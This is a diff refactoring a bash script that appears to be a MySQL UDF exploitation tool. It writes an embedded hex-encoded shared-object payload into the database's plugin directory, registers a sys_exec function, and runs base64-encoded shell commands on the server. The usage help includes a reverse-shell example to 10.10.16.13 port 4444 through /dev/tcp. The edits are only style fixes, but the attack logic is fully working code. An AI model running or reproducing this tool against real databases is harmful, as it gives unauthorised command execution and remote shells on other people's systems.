@@ -47,7 +47,7 @@ shellcode_x64="7f454c4602010100000000000000000003003e0001000000d00c0000000000004
 shellcode="${shellcode_x32}"
 
 # shellcode by arch
-if echo "$(arch)" | grep -q "64" ;then
+if arch | grep -q "64" ;then
     shellcode="${shellcode_x64}"
 fi
 
@@ -61,17 +61,17 @@ NONE='\033[0m'
 
 function usage() {
     printf "\n"
-    printf "${BLUE}INFO${NONE} usage:\n $0 -h=localhost -u=root -p=123456 -P=3306 -m=exec -c=\$(echo \"/bin/bash -i >& /dev/tcp/10.10.16.13/4444 0>&1\" | base64 -w 0) \n"
+    printf "${BLUE}%s${NONE} usage:\n $0 -h=localhost -u=root -p=123456 -P=3306 -m=exec -c=\$(echo \"/bin/bash -i >& /dev/tcp/10.10.16.13/4444 0>&1\" | base64 -w 0) \n" "INFO"
     printf "\n"
-    printf "${BLUE}INFO${NONE} set parameter like : ${BLUE}--param=value${NONE} or ${BLUE}-p=value${NONE}\n"
+    printf "${BLUE}%s${NONE} set parameter like : ${BLUE}--param=value${NONE} or ${BLUE}-p=value${NONE}\n" "INFO"
     printf "\n"
-    printf "${YELLOW}-H,--help${NONE} show this message\n"
-    printf "${YELLOW}-h,--host${NONE} db host, -h=localhost , --host=127.0.0.1 (default: localhost)\n"
-    printf "${YELLOW}-u,--user${NONE} db user, -u=root , --user=root (default: root)\n"
-    printf "${YELLOW}-p,--pass${NONE} db password, -p=123456 , --pass=123456 (default: '') \n\t${BLUE}INFO${NONE}: if password contains ${RED}!''\"\"\${}${NONE} you should ${BLUE}NOT${NONE} set -p flag, just use interactive mode${NONE}\n"
-    printf "${YELLOW}-P,--port${NONE} db port, -P=3306 , --port=3306 (default: 3306)\n"
-    printf "${YELLOW}-m,--mode${NONE} action mode, -m=check , --mode=dump \n\t action mode is that which action you want script to do. [check|dump|exec] (default: check) \n\t you should set ${BLUE}--cmd64${NONE} param when action mode is ${BLUE}exec${NONE}\n"
-    printf "${YELLOW}-c,--cmd64${NONE} cmd to execute, -c=Base64Str , --cmd=Base64Str \n\t a Base64 format cmd which you want execute by udf function.  \n\t example: ${BLUE}--cmd64=\$(echo \"id>/tmp/a.txt\" | base64 -w 0)${NONE}\n"
+    printf "${YELLOW}%s${NONE} show this message\n" "-H,--help"
+    printf "${YELLOW}%s${NONE} db host, -h=localhost , --host=127.0.0.1 (default: localhost)\n" "-h,--host"
+    printf "${YELLOW}%s${NONE} db user, -u=root , --user=root (default: root)\n" "-u,--user"
+    printf "${YELLOW}%s${NONE} db password, -p=123456 , --pass=123456 (default: '') \n\t${BLUE}INFO${NONE}: if password contains ${RED}!''\"\"\${}${NONE} you should ${BLUE}NOT${NONE} set -p flag, just use interactive mode${NONE}\n" "-p,--pass"
+    printf "${YELLOW}%s${NONE} db port, -P=3306 , --port=3306 (default: 3306)\n" "-P,--port"
+    printf "${YELLOW}%s${NONE} action mode, -m=check , --mode=dump \n\t action mode is that which action you want script to do. [check|dump|exec] (default: check) \n\t you should set ${BLUE}--cmd64${NONE} param when action mode is ${BLUE}exec${NONE}\n" "-m,--mode"
+    printf "${YELLOW}%s${NONE} cmd to execute, -c=Base64Str , --cmd=Base64Str \n\t a Base64 format cmd which you want execute by udf function.  \n\t example: ${BLUE}--cmd64=\$(echo \"id>/tmp/a.txt\" | base64 -w 0)${NONE}\n" "-c,--cmd,--cmd64"
 }
 
 # variables defination {{{1
@@ -90,8 +90,8 @@ MODE="${MODE_CHECK}"
 
 # arg parser {{{1
 while [ "$1" != "" ]; do
-    PARAM=`echo $1 | awk -F"=" '{print $1}'`
-    VALUE=`echo $1 | awk -F"=" '{print $2}'`
+    PARAM=$(echo "$1" | awk -F"=" '{print $1}')
+    VALUE=$(echo "$1" | awk -F"=" '{print $2}')
     case $PARAM in
         -H | --help)
             usage
@@ -110,14 +110,14 @@ while [ "$1" != "" ]; do
             PORT=$VALUE
             ;;
         -m | --mode)
-            if echo ${VALUE} | grep -iq "${MODE_CHECK}" ; then
+            if echo "${VALUE}" | grep -iq "${MODE_CHECK}" ; then
                 MODE="${MODE_CHECK}"
-            elif echo ${VALUE} | grep -iq "${MODE_DUMP}" ; then
+            elif echo "${VALUE}" | grep -iq "${MODE_DUMP}" ; then
                 MODE="${MODE_DUMP}"
-            elif echo ${VALUE} | grep -iq "${MODE_EXEC}" ; then
+            elif echo "${VALUE}" | grep -iq "${MODE_EXEC}" ; then
                 MODE="${MODE_EXEC}"
             else
-                printf "${RED}ERR${NONE}: Unknown MODE: '${RED}${VALUE}${NONE}'"
+                printf "${RED}%s${NONE}: Unknown MODE: '${RED}${VALUE}${NONE}'" "ERR"
                 exit 1
             fi
             ;;
@@ -125,7 +125,7 @@ while [ "$1" != "" ]; do
             CMD=${VALUE}
             ;;
         *)
-            printf "${RED}ERR${NONE}: Unknown param: '${RED}${PARAM}${NONE}'\n"
+            printf "${RED}%s${NONE}: Unknown param: '${RED}${PARAM}${NONE}'\n" "ERR"
             usage
             exit 1
             ;;
@@ -140,60 +140,60 @@ CONN="mysql -h${HOST} -u${USER} -P${PORT} -p${PASS} "
 # dump udf so file {{{1
 if [ "${MODE}" = "${MODE_DUMP}" ] ;then
     # already dump and import? {{{1
-    if  echo `${CONN} -e "select sys_exec('echo a') \G"` | grep -vq "FUNCTION sys_exec does not exist" ;then
-        printf "${YELLOW}WARN${NONE}: ${GREEN}sys_exec${NONE} function is already imported, please use ${YELLOW}--mode=${MODE_EXEC} --cmd=\$(echo 'cmd' | base64 -w 0)${NONE} execute cmd.\n"
+    if ${CONN} -e "select sys_exec('echo a') \G" | grep -vq "FUNCTION sys_exec does not exist" ;then
+        printf "${YELLOW}WARN${NONE}: ${GREEN}sys_exec${NONE} function is already imported, please use ${YELLOW}--mode=${MODE_EXEC} --cmd=%s${NONE} execute cmd.\n" "\$(echo 'cmd' | base64 -w 0)"
         exit 0
     fi
     #}}}
 
     # get plugin_dir {{{1
-    plugin_dir=`${CONN} -e "select @@plugin_dir \G" | grep -oP "(?<=@plugin_dir: )\S*"`
+    plugin_dir=$(${CONN} -e "select @@plugin_dir \G" | grep -oP "(?<=@plugin_dir: )\S*")
 
-    if [ -z $plugin_dir ]; then
-        printf "${RED}ERR${NONE}: could not locate plugin directory."
+    if [ -z "${plugin_dir}" ]; then
+        printf "${RED}%s${NONE}: could not locate plugin directory." "ERR"
         exit 1
     fi
 
-    printf "${GREEN}OK${NONE}: plgin_dir :${YELLOW} ${plugin_dir}${NONE} \n"
+    printf "${GREEN}%s${NONE}: plgin_dir :${YELLOW} ${plugin_dir}${NONE} \n" "OK"
     #}}}
 
     # dump udf so file as a *random* name {{{1
-    udf_filename="udf_`date +%s%N`.so"
+    udf_filename="udf_$(date +%s%N).so"
     udf_outfile="${plugin_dir}${udf_filename}"
 
-    `${CONN} -e "select binary 0x${shellcode} into dumpfile '${udf_outfile}' \G"`
+    ${CONN} -e "select binary 0x${shellcode} into dumpfile '${udf_outfile}' \G"
 
-    if [ ! -s ${udf_outfile} ]; then
-        printf "${RED}ERR${NONE}: write udf so file failure :${YELLOW} ${udf_outfile}${NONE} \n"
+    if [ ! -s "${udf_outfile}" ]; then
+        printf "${RED}%s${NONE}: write udf so file failure :${YELLOW} ${udf_outfile}${NONE} \n" "ERR"
     #    exit 1
     fi
-    printf "${GREEN}OK${NONE}: write udf so file success :${YELLOW} ${udf_outfile}${NONE} \n"
+    printf "${GREEN}%s${NONE}: write udf so file success :${YELLOW} ${udf_outfile}${NONE} \n" "OK"
     #}}}
 
     # create sys_exec function
-    `${CONN} -e "create function sys_exec returns int soname '${udf_filename}' \G"`
+    ${CONN} -e "create function sys_exec returns int soname '${udf_filename}' \G"
 #}}}
 
 # check udf (sys_exec) is ready? {{{1
 elif [ "${MODE}" = "${MODE_CHECK}" ]; then
-    if  echo `${CONN} -e "select sys_exec('echo a') \G"` | grep -q "FUNCTION sys_exec does not exist" ;then
-        printf "${RED}ERR${NONE}: ${YELLOW}sys_exec${NONE} function is not execuable, please use ${YELLOW}--mode=${MODE_DUMP}${NONE} dump udf.so first.\n"
+    if ${CONN} -e "select sys_exec('echo a') \G" | grep -q "FUNCTION sys_exec does not exist" ;then
+        printf "${RED}%s${NONE}: ${YELLOW}sys_exec${NONE} function is not execuable, please use ${YELLOW}--mode=${MODE_DUMP}${NONE} dump udf.so first.\n" "ERR"
         exit 1
     else
-        printf "${GREEN}OK${NONE}: ${YELLOW}sys_exec${NONE} function is ${GREEN}execuable${NONE}, please use ${YELLOW}--mode=${MODE_EXEC} --cmd=\$(echo 'cmd' | base64 -w 0)${NONE} execute cmd.\n"
+        printf "${GREEN}%s${NONE}: ${YELLOW}sys_exec${NONE} function is ${GREEN}execuable${NONE}, please use ${YELLOW}--mode=${MODE_EXEC} --cmd=\$(echo 'cmd' | base64 -w 0)${NONE} execute cmd.\n" "OK"
     fi
 #}}}
 
 # exec cmd with udf {{{1
 elif [ "${MODE}" = "${MODE_EXEC}" ]; then
-    if [ -z ${CMD} ]; then
-        printf "${RED}ERR${NONE}: ${YELLOW}--mode=${MODE_EXEC}${NONE} should be set with ${YELLOW}--cmd=\$(echo 'cmd' | base64 -w 0)${NONE} to execute cmd.\n"
+    if [ -z "${CMD}" ]; then
+        printf "${RED}%s${NONE}: ${YELLOW}--mode=${MODE_EXEC}${NONE} should be set with ${YELLOW}--cmd=\$(echo 'cmd' | base64 -w 0)${NONE} to execute cmd.\n" "ERR"
         exit 1
     fi
     # execute cmd
-    exec_res=`${CONN} -e "select sys_exec('echo -n ${CMD} | base64 -d | bash')" 2>&1`
-    if echo ${exec_res} | grep -q "FUNCTION sys_exec does not exist" ; then
-        printf "${RED}ERR${NONE}: ${YELLOW}sys_exec${NONE} function is not execuable, please use ${YELLOW}--mode=${MODE_DUMP}${NONE} dump udf.so first.\n"
+    exec_res=$(${CONN} -e "select sys_exec('echo -n ${CMD} | base64 -d | bash')" 2>&1)
+    if echo "${exec_res}" | grep -q "FUNCTION sys_exec does not exist" ; then
+        printf "${RED}%s${NONE}: ${YELLOW}sys_exec${NONE} function is not execuable, please use ${YELLOW}--mode=${MODE_DUMP}${NONE} dump udf.so first.\n" "ERR"
         exit 1
     fi
 #}}}
